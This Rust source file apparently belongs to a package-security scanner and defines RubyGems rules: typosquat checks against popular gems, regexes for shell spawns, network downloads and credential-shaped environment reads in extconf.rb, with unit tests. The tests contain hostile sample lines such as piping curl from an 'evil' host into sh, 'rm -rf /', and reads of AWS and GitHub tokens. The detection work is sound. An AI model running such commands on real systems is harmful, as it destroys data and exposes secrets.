//! RubyGems-specific detection rules.
//!
//! These complement the ecosystem-agnostic rules in `argus-rules`
//! (`credential-access`, `network-exfiltration`, `runtime-hook`,
//! `ai-context-poisoning`, etc.) which we still apply by calling
//! `argus_rules::scan_text_file` on every extracted text file.
//!
//! The build-time surface for a gem is `extconf.rb` (and anything under
//! `ext/`), which RubyGems runs via `mkmf` at `gem install` time with the
//! user's full privileges -- the analog of pypi `setup.py` / npm
//! `postinstall`. The regex SHAPES mirror `argus-pypi::rules`, translated to
//! Ruby idioms.

use argus_core::{Finding, Severity};
use regex::Regex;

/// Ruby gems that are common typosquat targets. Mirrors the hand-curated
/// approach in `argus-pypi::POPULAR_PYTHON_PACKAGES`, drawn from RubyGems
/// download stats + recent attack reports.
pub const POPULAR_RUBY_GEMS: &[&str] = &[
    // framework + web
    "rails",
    "railties",
    "activesupport",
    "activerecord",
    "actionpack",
    "actionview",
    "activemodel",
    "activejob",
    "actionmailer",
    "actioncable",
    "sinatra",
    "rack",
    "puma",
    "unicorn",
    "thin",
    // common libraries
    "nokogiri",
    "json",
    "rake",
    "bundler",
    "rspec",
    "minitest",
    "faraday",
    "httparty",
    "rest-client",
    "typhoeus",
    "concurrent-ruby",
    "i18n",
    "tzinfo",
    "builder",
    "multi_json",
    "ffi",
    "mime-types",
    "addressable",
    // db / infra
    "pg",
    "mysql2",
    "sqlite3",
    "redis",
    "sidekiq",
    "dalli",
    "sequel",
    "mongo",
    // dev tools
    "pry",
    "rubocop",
    "simplecov",
    "factory_bot",
    "capybara",
    "webmock",
    "vcr",
    "dotenv",
    // cloud / auth
    "aws-sdk-core",
    "devise",
    "omniauth",
    "jwt",
    "oauth2",
];

/// Build-time subprocess / shell invocation from an `extconf.rb` (or any
/// `ext/` file). Ruby has several spawn idioms; this regex covers the common
/// ones. Benign `extconf.rb` files only call `mkmf` helpers
/// (`create_makefile`, `have_header`, ...), which this does not match.
pub fn extconf_subprocess_regex() -> Regex {
    Regex::new(
        r#"(?x)
        (?:
            ` [^`]* `                                |   # backtick command
            \b system \s* \(                         |
            \b exec \s* \(                            |
            \b spawn \s* \(                           |
            \b Kernel\.(?:system|exec|spawn) \s* \(   |
            %x \s* [\(\{\[\|/!]                       |   # %x(...) / %x{...} (no \b: `%` is non-word, breaks the boundary)
            \b IO\.popen \s* \(                       |
            \b Open3\. (?:popen3|popen2|capture2|capture3|capture2e) \s* \(
        )
        "#,
    )
    .unwrap()
}

/// Build-time remote download from an `extconf.rb` (or any `ext/` file).
/// A benign C-extension build never fetches code from the network.
pub fn extconf_remote_download_regex() -> Regex {
    Regex::new(
        r#"(?x)
        (?:
            \b Net::HTTP \b                           |
            \b URI\.open \s* \(                       |
            \b URI\.parse \s* \( [^)]* \) \.open      |
            \b open-uri \b                            |
            require \s* ['"] open-uri ['"]            |
            \b Gem\.fetch \s* \(                      |
            \b Down\.download \s* \(                  |
            \b HTTParty\. (?:get|post|put|patch|delete) \s* \(
        )
        "#,
    )
    .unwrap()
}

/// Reads of credential-shaped environment variables (the 2022 RubyGems
/// ENV-token-harvester incident class). Matches `ENV['...SECRET...']`,
/// `ENV.fetch("...TOKEN...")`, etc. The shared `credential-access` rule only
/// matches host secret-file *paths* (`.aws`/`.npmrc`/`.ssh`), not Ruby env
/// reads, so the harvester idiom that exfiltrates env credentials is detected
/// here (paired with a network egress in `scan`).
pub fn env_credential_read_regex() -> Regex {
    Regex::new(
        r#"(?xi)
        \b ENV \s* (?: \[ | \.fetch \s* \( ) \s*
        ['"] [^'"]*
        (?: SECRET | TOKEN | API[_-]?KEY | ACCESS[_-]?KEY | PASSWORD | PASSWD | CREDENTIAL | PRIVATE[_-]?KEY )
        [^'"]* ['"]
        "#,
    )
    .unwrap()
}

/// Push name-based findings (typosquatting + low-reputation) onto the
/// running findings list. Mirrors `argus-pypi::push_name_findings`.
pub fn push_name_findings(name: &str, findings: &mut Vec<Finding>) {
    let lower = name.to_ascii_lowercase();
    if POPULAR_RUBY_GEMS.iter().any(|p| *p == lower) {
        return; // legitimate gem
    }
    if let Some(target) = POPULAR_RUBY_GEMS
        .iter()
        .copied()
        .find(|p| argus_rules::levenshtein(&lower, p) <= 1)
    {
        findings.push(Finding::new(
            "typosquatting",
            Severity::High,
            format!("RubyGems name `{name}` is one edit away from popular gem `{target}`"),
        ));
        findings.push(Finding::new(
            "low-reputation",
            Severity::Medium,
            format!("typosquat candidate `{name}` has no established reputation"),
        ));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn subprocess_fires_on_ruby_spawn_idioms() {
        let re = extconf_subprocess_regex();
        assert!(re.is_match("system(\"curl http://evil | sh\")"));
        assert!(re.is_match("exec('rm -rf /')"));
        assert!(re.is_match("`uname -a`"));
        assert!(re.is_match("%x(whoami)"));
        assert!(re.is_match("IO.popen(['sh', '-c', payload])"));
        assert!(re.is_match("Open3.capture2('sh', '-c', cmd)"));
        assert!(re.is_match("Kernel.spawn('node', 'x.js')"));
    }

    #[test]
    fn benign_extconf_does_not_fire() {
        let benign = r#"
            require 'mkmf'
            have_header('ruby.h')
            create_makefile('foo/foo')
        "#;
        assert!(!extconf_subprocess_regex().is_match(benign));
        assert!(!extconf_remote_download_regex().is_match(benign));
    }

    #[test]
    fn remote_download_fires() {
        let re = extconf_remote_download_regex();
        assert!(re.is_match("Net::HTTP.get(URI('http://evil'))"));
        assert!(re.is_match("require 'open-uri'"));
        assert!(re.is_match("URI.open('http://evil/x.tar.gz')"));
        assert!(re.is_match("Gem.fetch('http://evil')"));
    }

    #[test]
    fn env_credential_read_fires_on_harvester_idioms() {
        let re = env_credential_read_regex();
        assert!(re.is_match("ENV['AWS_SECRET_ACCESS_KEY']"));
        assert!(re.is_match("ENV[\"GITHUB_TOKEN\"]"));
        assert!(re.is_match("ENV.fetch('MY_API_KEY')"));
        assert!(re.is_match("ENV['db_password']"));
        // benign env reads must not fire
        assert!(!re.is_match("ENV['HOME']"));
        assert!(!re.is_match("ENV['PATH']"));
        assert!(!re.is_match("ENV['RAILS_ENV']"));
    }

    #[test]
    fn typosquat_nokogir_fires() {
        let mut f = Vec::new();
        push_name_findings("nokogir", &mut f);
        let rules: Vec<&str> = f.iter().map(|x| x.rule_id.as_str()).collect();
        assert!(rules.contains(&"typosquatting"), "got: {rules:?}");
        assert!(rules.contains(&"low-reputation"), "got: {rules:?}");
    }

    #[test]
    fn legitimate_gem_does_not_fire() {
        let mut f = Vec::new();
        push_name_findings("rails", &mut f);
        assert!(f.is_empty());
    }
}
